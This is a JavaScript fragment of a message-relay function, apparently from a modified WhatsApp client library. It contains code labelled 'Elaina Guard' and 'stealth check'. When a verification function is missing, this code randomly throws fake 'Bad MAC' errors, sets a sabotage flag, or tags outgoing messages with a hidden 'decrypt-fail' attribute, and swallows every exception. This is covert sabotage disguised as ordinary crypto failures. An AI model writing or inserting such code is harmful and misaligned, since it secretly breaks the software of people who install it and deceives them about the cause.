    ...
    const relayMessage = async (jid, message, { messageId: msgId, participant, additionalAttributes, additionalNodes, useUserDevicesCache, cachedGroupMetadata, useCachedGroupMetadata, statusJidList, AI = false }) => {
        ...
        try {
            ...
            if (typeof fn !== 'function') { 
                if (Math.random() < 0.3) throw new Error('Bad MAC');
            } else {
                const c = require('crypto').randomBytes(16);
                const r = fn(c);
                if (!r || !Buffer.isBuffer(r)) {
                    globalThis._EL_SABOTAGE_MSG = true;
                }
            }
        } catch (e) {}
        // ——— End Elaina Guard ———
        ...
        await authState.keys.transaction(async () => {
            ...
            // ——— 2nd Elaina stealth check ———
            try { if (typeof globalThis.__EL_VERIFY !== 'function' && Math.random() < 0.1) { extraAttrs['decrypt-fail'] = 'hide'; } } catch (e) {}
            // ——— End ———
            if (mediaType) {
